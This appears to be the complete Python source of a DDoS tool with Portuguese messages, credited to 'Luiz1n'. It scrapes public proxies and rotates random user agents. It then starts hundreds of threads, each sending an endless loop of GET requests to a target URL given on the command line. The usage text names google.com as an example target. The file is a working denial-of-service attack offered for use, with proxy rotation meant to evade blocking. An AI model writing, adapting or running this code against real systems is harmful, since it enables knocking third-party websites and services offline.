import time
import threading
import os
import sys
import platform
import random

_path_requirements = 'just/requirements.txt'
_path_proxies = 'just/proxies.txt'
_version = open('just/versao').read()

def Banner():
	print('''

 _______   _______    ______    ______  
/       \ /       \  /      \  /      \ 
$$$$$$$  |$$$$$$$  |/$$$$$$  |/$$$$$$  |
$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ \__$$/ 
$$ |  $$ |$$ |  $$ |$$ |  $$ |$$      \ 
$$ |  $$ |$$ |  $$ |$$ |  $$ | $$$$$$  |
$$ |__$$ |$$ |__$$ |$$ \__$$ |/  \__$$ |
$$    $$/ $$    $$/ $$    $$/ $$    $$/ 
$$$$$$$/  $$$$$$$/   $$$$$$/   $$$$$$/  
                                        
   coded by Luiz1n | https://github.com/luiz1n

		\n''')
Banner()

def CheckClear():
	if platform.system() == "Windows":
		os.system("cls")
	else:
		os.system("clear")

def SaveProxies(content):
	with open(_path_proxies, 'wb') as file:
		file.write(content)

def checkGoogle(versao_att):
	if platform.system() == "Windows":
		"https://github.com/luiz1n/DDoS/releases/download/1.1/DDoS.zip"
		os.system(f'start chrome github.com/luiz1n/DDoS/releases/download/{versao_att}/DDoS.zip')
	else:
		os.system(f"google-chrome github.com/luiz1n/DDoS/releases/download/{versao_att}/DDoS.zip")

def CheckInstaller():
	try:
		import requests
		import colorama

	except:
		print('\n[ERRO] -> Instalando requerimentos...')
		time.sleep(1)
		os.system(f"python -m pip install -r {_path_requirements}")
		CheckClear()

CheckInstaller()

from Logger import *
import requests
from fake_useragent import UserAgent

def CheckUpdates():

	versao_atualizada = requests.get("https://pastebin.com/raw/hbF8RiMS").text
	if _version != versao_atualizada.strip():
		Error(f'{_version} | {versao_atualizada}')
		Error("[Error] -> Existe uma nova versão do programa, redirecionando...")
		time.sleep(1)
		checkGoogle(versao_atualizada)
		exit()

	else:
		Sucesso(f"[Sucesso] O programa está devidamente atualizado | Versão Atual: {versao_atualizada}")

CheckUpdates()

def Agent():
	user_agent = UserAgent().random
	return user_agent

def Proxies():

	arq = open(_path_proxies)
	proxy = random.choice(arq.readlines())
	proxy = proxy.strip()
	return proxy

def CheckInternet():
	try:
		requests.get("https://google.com/")
		Sucesso('[Sucesso] Você está conectado a internet, gerando proxies...')
	except:
		Error("[Error] Você não está conectado a internet. Conecte-se e execute o script novamente.")
		exit()

def Generate():
	try:
		_request = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=yes&anonymity=all&simplified=true", timeout=20).content
		SaveProxies(_request.strip())
		Sucesso("[Sucesso] Sucesso ao obter novas proxies. <Carregando DDoS> [...]")

	except:
		Error("[Error] O site proxy-scrape não está respondendo.")

def HowToUse():
	os.system("cls")
	Error('''

Modo de uso: ddos.py <url> <threads>

Exemplo: ddos.py https://google.com/ 300 

		''')

CheckInternet()
Generate()

try:

	_url = sys.argv[1]
	_threads = int(sys.argv[2])

	def DDoS():

		proxies = {'https': f'https://{Proxies()}'}
		headers = {'User-Agent': Agent()}

		while True:
			try:
				Sucesso(f"[Sucesso] Atacando: {_url} | Threads: {_threads}")
				requests.get(_url, headers=headers, proxies=proxies)
			except Exception as e:
				pass

	def CreateThreading():
		for thread in range(_threads):
			_thread = threading.Thread(target=DDoS)
			_thread.start()


	iniciar = input('\n\n[Enter] -> Deseja iniciar?')
	CreateThreading()


except IndexError:
	HowToUse()
	exit()

except ValueError:
	Error(f"O Campo 'Threads' Só aceita números. Recomendado: 500-1000")